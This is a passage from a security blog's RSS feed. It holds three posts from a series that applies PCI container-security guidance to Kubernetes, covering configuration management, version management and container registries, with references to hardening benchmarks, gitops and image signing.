				<description>&lt;p&gt;This is the fifteenth part of a series of posts looking at the PCI recommendations for container security as they apply to Kubernetes environments. This time we’re looking at the Configuration Management section. An index of the posts in this series can be found &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Similarly to the previous section on &lt;a href=&quot;https://raesene.github.io/blog/2022/12/16/PCI-Kubernetes-Section14-Version-Management/&quot;&gt;version management&lt;/a&gt; this section isn’t so much around security configuration as the policies and processes that should be in place in an in-scope environment.&lt;/p&gt;

&lt;p&gt;As the guidance here relates to the secure configuration of container orchestration environments, and having companies develop standards for secure configuration of their container environments, it’s worth noting what options there are for Kubernetes. Whilst companies should customize these to their own environments, there are some options that can be used as a starting point.&lt;/p&gt;

&lt;p&gt;It’s also worth noting that as described in the post about &lt;a href=&quot;https://raesene.github.io/blog/2022/09/20/Assessing-Kubernetes-Clusters-for-PCI-Compliance/&quot;&gt;the challenges of assessing Kubernetes clusters for PCI Compliance&lt;/a&gt; one of the things to think about when looking at compliance standards is which distributions and versions are covered.&lt;/p&gt;

&lt;h2 id=&quot;cis-benchmarks&quot;&gt;CIS Benchmarks&lt;/h2&gt;

&lt;p&gt;There are a couple of CIS benchmarks which can be relevant to secure configuration of Kubernetes clusters. Firstly there’s the &lt;a href=&quot;https://www.cisecurity.org/benchmark/docker&quot;&gt;CIS Benchmark for Docker&lt;/a&gt;. It’s important to note here that this benchmark was designed for standalone Docker installations and not for a use case where Docker is a Container Runtime in a Kubernetes cluster. A number of the requirements will not apply to Kubernetes environments that use Docker. It’s also worth noting that there are no current benchmarks for Containerd or CRI-O.&lt;/p&gt;

&lt;p&gt;At the Kubernetes level there is a set of related CIS Benchmarks. The top-level CIS &lt;a href=&quot;https://www.cisecurity.org/benchmark/kubernetes&quot;&gt;Benchmark for Kubernetes&lt;/a&gt; is designed to address &lt;a href=&quot;https://kubernetes.io/docs/reference/setup-tools/kubeadm/&quot;&gt;kubeadm&lt;/a&gt; clusters. Using it for any other Kubernetes distribution could require the details of checks to be modified to take account of differences in the implementation of Kubernetes. There are versions of the benchmark for various versions of Kubernetes going back to 1.16, however not every version of k8s has a corresponding CIS benchmark.&lt;/p&gt;

&lt;p&gt;There are also a set of CIS Benchmarks for various managed Kubernetes distributions, which provide more specific detail for those environments. C Currently there is coverage for &lt;a href=&quot;https://cloud.google.com/kubernetes-engine&quot;&gt;GKE&lt;/a&gt;, &lt;a href=&quot;https://aws.amazon.com/eks/&quot;&gt;EKS&lt;/a&gt;, &lt;a href=&quot;https://azure.microsoft.com/en-gb/products/kubernetes-service/&quot;&gt;AKS&lt;/a&gt;, &lt;a href=&quot;https://www.alibabacloud.com/product/kubernetes&quot;&gt;ACK&lt;/a&gt;, &lt;a href=&quot;https://www.oracle.com/uk/cloud/cloud-native/container-engine-kubernetes/&quot;&gt;OKE&lt;/a&gt; and &lt;a href=&quot;https://www.redhat.com/en/technologies/cloud-computing/openshift&quot;&gt;OpenShift&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;nsa-kubernetes-hardening-guide&quot;&gt;NSA Kubernetes Hardening Guide&lt;/h2&gt;

&lt;p&gt;Whilst it often gets used similarly to the CIS benchmarks the &lt;a href=&quot;https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF&quot;&gt;NSA Kubernetes Hardening Guide&lt;/a&gt; is wider in scope and not designed to be a configuration standard. Whilst it does provide some guidance on specific settings in some areas, it doesn’t set out to be detailed across all areas, in the way the CIS benchmarks do.&lt;/p&gt;

&lt;h2 id=&quot;disa-stig&quot;&gt;DISA STIG&lt;/h2&gt;

&lt;p&gt;The DISA &lt;a href=&quot;https://www.stigviewer.com/stig/kubernetes/2021-04-14/&quot;&gt;Kubernetes Security Technical Implementation Guide&lt;/a&gt; is another option which does have detailed requirements. However it’s important to note that, as of December 2022, it’s not been updated recently, so checks may be outdated and whilst it doesn’t specify a specific Kubernetes distribution it addresses, from the paths in the document it appears to be Kubeadm.&lt;/p&gt;

&lt;p&gt;In terms of the PCI requirements there’s one in this section.&lt;/p&gt;

&lt;h2 id=&quot;section-151&quot;&gt;Section 15.1&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Container orchestration tools may be misconfigured and introduce security vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;a. All configurations and container images should be tested in a production-like environment prior to deployment.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;b. Configuration standards that address all known security vulnerabilities and are consistent with industry-accepted hardening standards and  vendor security guidance should be developed for all system components, including container orchestration tools.&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;i. Address all known security vulnerabilities.&lt;/li&gt;
      &lt;li&gt;ii. Be consistent with industry-accepted system hardening standards or vendor hardening recommendations.&lt;/li&gt;
      &lt;li&gt;iii. Be updated as new vulnerability issues are identified.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Assessing the first part of this recommendation would involve understanding the companies CI/CD environment and how changes to cluster configuration are tested. Typically some form of automated testing should be done on any Kubernetes manifest before deployment. For the second part understanding which standard(s) are in use and how compliance is achieved (e.g. CSPM tooling)&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Creating a security configuration standard is a sensible part of larger Kubernetes deployments as it will help to maintain consistent configuration and security levels across the environment, however it does require some effort to tailor this to specific Kubernetes distributions and versions.&lt;/p&gt;
</description>
				<pubDate>Sun, 18 Dec 2022 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2022/12/18/PCI-Kubernetes-Section15-Configuration-Management/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/18/PCI-Kubernetes-Section15-Configuration-Management/</guid>
			</item>
		
			<item>
				<title>PCI Compliance for Kubernetes in detail - Part 14 - Version Management</title>
				<description>&lt;p&gt;This is the fourteenth part of a series of posts looking at the PCI recommendations for container security as they apply to Kubernetes environments. This time we’re looking at the Version Management section. An index of the posts in this series that I’ve written so far can be found &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This one is a slightly interesting one as it’s not really a security issue, but more of a best practice, but there are some considerations which are specific to containerization. The main one is the move to “Infrastructure As Code”, where the setup of Kubernetes clusters and their applications are stored in formats like &lt;a href=&quot;https://yaml.org/&quot;&gt;YAML&lt;/a&gt; and &lt;a href=&quot;https://github.com/hashicorp/hcl&quot;&gt;HCL&lt;/a&gt;, and processed by tools like &lt;a href=&quot;https://helm.sh/&quot;&gt;Helm&lt;/a&gt; and &lt;a href=&quot;https://www.terraform.io/&quot;&gt;Terraform&lt;/a&gt;. Having all of this information stored in files lends itself to improved version management practices as, in theory anyway, everything which is neeeded to re-create the environment is stored in the files.&lt;/p&gt;

&lt;p&gt;Of course, in addition to the tools, we need an approach to managing their versioning and storage if we want to achieve our goals. One approach which lends itself to this is &lt;a href=&quot;https://www.weave.works/technologies/gitops/&quot;&gt;gitops&lt;/a&gt; which uses git as the source of truth for the environment.&lt;/p&gt;

&lt;p&gt;These tools and approaches are not specific to Kubernetes, but they are a natural fit for it, and so it’s worth considering them when looking at the PCI requirements.&lt;/p&gt;

&lt;p&gt;In terms of the PCI requirements there’s one in this section.&lt;/p&gt;

&lt;h2 id=&quot;section-141&quot;&gt;Section 14.1&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Without proper control and versioning of container orchestration configuration files, it may be possible for an attacker to make an unauthorized modification to an environment’s setup&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - a. Version control should be used to manage all non-secret configuration files. b. Related objects should be grouped into a
single file. c. Labels should be used to semantically identify objects.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Reviewing a cluster for this recommendation would likely start with speaking to the operators to understand how they control the configuration files, and then checking the management of key elements such as the helm charts and terraform files (or alternative tools if they are being used).&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;This is a relatively short post as the PCI recommendations are relatively straightforward and Kubernetes doesn’t introduce any very specific concerns, however it’s another one to add to the list of things to consider.&lt;/p&gt;
</description>
				<pubDate>Fri, 16 Dec 2022 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2022/12/16/PCI-Kubernetes-Section14-Version-Management/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/16/PCI-Kubernetes-Section14-Version-Management/</guid>
			</item>
		
			<item>
				<title>PCI Compliance for Kubernetes in detail - Part 13 - Registry</title>
				<description>&lt;p&gt;This is the thirteenth part of a series of posts looking at the PCI recommendations for container security as they apply to Kubernetes environments. This time we’re looking at the “Registry” section which talks about Container Registry controls. An index of the posts in this series can be found &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Container registries are a key part of an Kubernetes environment as they store the images which are used to create the containers that run the applications hosted in the cluster. Also as I mentioned in the post on &lt;a href=&quot;https://raesene.github.io/blog/2022/12/03/PCI-Kubernetes-Section10-Patching/&quot;&gt;patching&lt;/a&gt;, software updates should be carried by re-building images, pushing them to the registry and then rolling out the new version of the application. This means that the registry is a key part of the update process.&lt;/p&gt;

&lt;p&gt;From a technology standpoint container registries are relatively simple. They provide an HTTP API which follows the &lt;a href=&quot;https://github.com/opencontainers/distribution-spec&quot;&gt;OCI distribution specification&lt;/a&gt;. The OCI distribution specification is a standard for how to interact with a registry, it doesn’t specify how the registry is implemented. There are a number of different implementations of the specification, including &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;, &lt;a href=&quot;https://azure.microsoft.com/en-us/services/container-registry/&quot;&gt;Azure Container Registry&lt;/a&gt;, &lt;a href=&quot;https://cloud.google.com/container-registry&quot;&gt;Google Container Registry&lt;/a&gt; and &lt;a href=&quot;https://aws.amazon.com/ecr/&quot;&gt;Amazon Elastic Container Registry&lt;/a&gt;. The specification is also implemented by &lt;a href=&quot;https://goharbor.io/&quot;&gt;Harbor&lt;/a&gt;, an open source registry implementation.&lt;/p&gt;

&lt;p&gt;OCI Registries can also be used to store other types of artifacts, such as Helm charts, using projects like &lt;a href=&quot;https://oras.land/&quot;&gt;ORAS&lt;/a&gt; but for the purposes of this post I’m going to focus on the storage of container images.&lt;/p&gt;

&lt;p&gt;An important point about registries is that public images in registries like Docker Hub are not necessarily maintained/curated. There is a set of &lt;a href=&quot;https://docs.docker.com/docker-hub/official_images/&quot;&gt;Docker Official Images&lt;/a&gt; which are generally maintained (although some are &lt;a href=&quot;https://blog.aquasec.com/docker-official-images&quot;&gt;deprecated&lt;/a&gt; so care is still needed) but there are also a lot of images which are not maintained by anyone. This means that you should be careful about using images from public registries, especially if they are not maintained by a trusted source. You should also be careful about using images from private registries that you don’t control. If you’re using a private registry you should be careful about who has access to it and what images are stored in it.&lt;/p&gt;

&lt;p&gt;In terms of managing images for production systems, the safest approach is to combine internally managed images hosted in a private registry with public images where required. The public images should be signed using something like &lt;a href=&quot;https://github.com/sigstore/cosign&quot;&gt;cosign&lt;/a&gt; or pinned to specific SHA256 hashes. This means that you can be sure that the image you’re using is the one you expect and that it hasn’t been modified.&lt;/p&gt;

&lt;p&gt;In terms of the PCI requirements there’s four in this section.&lt;/p&gt;

&lt;h2 id=&quot;section-131&quot;&gt;Section 13.1&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Unauthorized modification of an organization’s container images could allow an attacker to place malicious software into the production container environment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - a. Access to container registries managed by the organization should be controlled. b. Rights to modify or replace images should be limited to authorized individuals.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Exact details of how this is achieved will depend on the registry or registries in use, but access control should be applied to any modification of the images in the registry. Reviewing for this could be done by listing the container images in use in a cluster and then testing to see whether these images are accessible publicly/without authentication and confirming that attempts to modify them without authentication are rejected.&lt;/p&gt;

&lt;h2 id=&quot;section-132&quot;&gt;Section 13.2&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - A lack of segregation between production and non-production container registries may result in insecure images deployed to the production environment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Consider using two registries, one for production or business-critical workloads and one for development/test purposes, to assist in preventing image sprawl and the opportunity for an unmaintained or vulnerable image being accidentally pulled into a production cluster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Reviewing this recommendation would likely largely be done by speaking to the people responsible for the PCI environment and confirming which registries are used. A check coule be carried out again by listing the images in use in the cluster and then checking to see whether they are from a production or non-production registry.&lt;/p&gt;

&lt;h2 id=&quot;section-133&quot;&gt;Section 13.3&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Vulnerabilities can be present in base images, regardless of the source of the images, via misconfiguration and other methods.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - If available, registries should regularly scan images and prevent vulnerable images from being deployed to container runtime environments.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Vulnerability scanning at the registry level is one of the better approaches to container vulnerability scanning as the registry should be the canonical source of images. Some registries will provide image scanning functionality directly, or third-party scanning tools such as &lt;a href=&quot;https://github.com/aquasecurity/trivy&quot;&gt;Trivy&lt;/a&gt; can be used to scan images.&lt;/p&gt;

&lt;h2 id=&quot;section-134&quot;&gt;Section 13.4&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Known good images can be maliciously or inadvertently substituted or modified and deployed to container runtime environments..&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Registries should be configured to integrate with the image build processes such that only signed images from authorized build
pipelines are available for deployment to container runtime environments.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Image signing is a good control to help ensure that the images in the registry are the ones that you expect. The main ecosystem currently in use for this is &lt;a href=&quot;https://www.sigstore.dev/&quot;&gt;sigstore&lt;/a&gt; which allows for signatures to be stored on a transparency log. This allows for the signatures to be verified without having to trust the registry.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Container registries are a vital part of any Kubernetes clusters, so it’s not surprising that there are control recommendations relating to them. Used correctly, they can help ensure that Kubernetes clusters are running trusted and up to date images.&lt;/p&gt;
</description>
				<pubDate>Wed, 14 Dec 2022 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2022/12/14/PCI-Kubernetes-Section13-Registry/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/14/PCI-Kubernetes-Section13-Registry/</guid>
			</item>
		
	</channel>
</rss>
